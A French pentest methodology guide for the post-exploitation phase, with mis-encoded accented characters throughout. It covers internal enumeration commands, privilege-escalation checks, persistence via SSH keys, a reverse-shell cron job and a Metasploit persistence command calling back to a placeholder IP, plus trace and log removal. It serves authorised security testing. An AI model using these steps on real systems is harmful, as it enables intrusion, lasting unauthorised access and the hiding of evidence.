# üèÅ GUIDE M√âTHODOLOGIQUE - POST-EXPLOITATION

---

La phase de post-exploitation commence apr√®s avoir obtenu un acc√®s initial √† un syst√®me. Elle se concentre sur la consolidation de cet acc√®s, l'√©l√©vation des privil√®ges, le mouvement lat√©ral et, finalement, le nettoyage et le rapport.

## üéØ √âTAPE 1 : √âNUM√âRATION INTERNE
Une fois √† l'int√©rieur, la reconnaissance recommence.
- **Qui suis-je ?** (`whoami`, `id`)
- **O√π suis-je ?** (`ip a`, `ifconfig`, `hostname`)
- **Quels sont mes privil√®ges ?** (`sudo -l`)
- **Quels services tournent sur la machine ?** (`netstat -tulpn`, `ss -tulpn`)
- **Quels autres utilisateurs existent ?** (`cat /etc/passwd`)
- **Quels sont les processus int√©ressants ?** (`ps aux`)

## üéØ √âTAPE 2 : √âL√âVATION DE PRIVIL√àGES
L'objectif est de passer d'un utilisateur standard √† un utilisateur avec des droits plus √©lev√©s (comme `root` ou `SYSTEM`).
- **Rechercher des exploits de noyau (Kernel Exploits)**:
  ```bash
  # V√©rifier la version du noyau
  uname -a
  # Rechercher des exploits correspondants sur Exploit-DB
  ```
- **V√©rifier les permissions `sudo`**:
  ```bash
  sudo -l
  # Si vous pouvez ex√©cuter une commande en tant que root, exploitez-la (voir GTFOBins).
  ```
- **Rechercher des fichiers avec des permissions SUID/SGID**:
  ```bash
  find / -perm -u=s -type f 2>/dev/null
  ```
- **Exploiter des services mal configur√©s** (ex: base de donn√©es avec mot de passe faible, serveur web local).

## üéØ √âTAPE 3 : MAINTIEN DE L'ACC√àS (PERSISTANCE)
> ‚ö†Ô∏è **Attention**: Ne mettre en place la persistance qu'avec une autorisation explicite.

- **Ajouter une cl√© SSH**: Copiez votre cl√© publique dans le fichier `~/.ssh/authorized_keys` de l'utilisateur compromis.
- **Cr√©er un cron job**: Planifiez une t√¢che qui ex√©cute un reverse shell √† intervalle r√©gulier.
- **Utiliser des modules de persistance Metasploit**:
  ```meterpreter
  run persistence -U -i 5 -p 4444 -r <VOTRE_IP>
  ```

## üéØ √âTAPE 4 : NETTOYAGE ET RAPPORT
C'est la phase finale et la plus professionnelle.

### 4.1 Nettoyage
- Supprimez tous les fichiers que vous avez upload√©s (shells, scripts, etc.).
- Effacez l'historique des commandes (`history -c`).
- Supprimez les entr√©es de logs pertinentes si cela fait partie du p√©rim√®tre de l'audit.

### 4.2 Documentation et Rapport
- **R√©sum√© Ex√©cutif**: Un r√©sum√© simple pour les d√©cideurs, expliquant le risque business.
- **Rapport Technique D√©taill√©**: Expliquez chaque vuln√©rabilit√©, comment vous l'avez exploit√©e (preuve de concept), et son impact.
- **Recommandations de Correction**: Fournissez des solutions claires et r√©alisables pour chaque vuln√©rabilit√©.

---

## ‚úÖ CHECKLIST FINALE
- [ ] Toutes les traces ont-elles √©t√© supprim√©es ?
- [ ] Le rapport est-il complet, clair et professionnel ?
- [ ] Les preuves de concept sont-elles bien document√©es ?
- [ ] Le client a-t-il √©t√© inform√© des r√©sultats de mani√®re s√©curis√©e ?
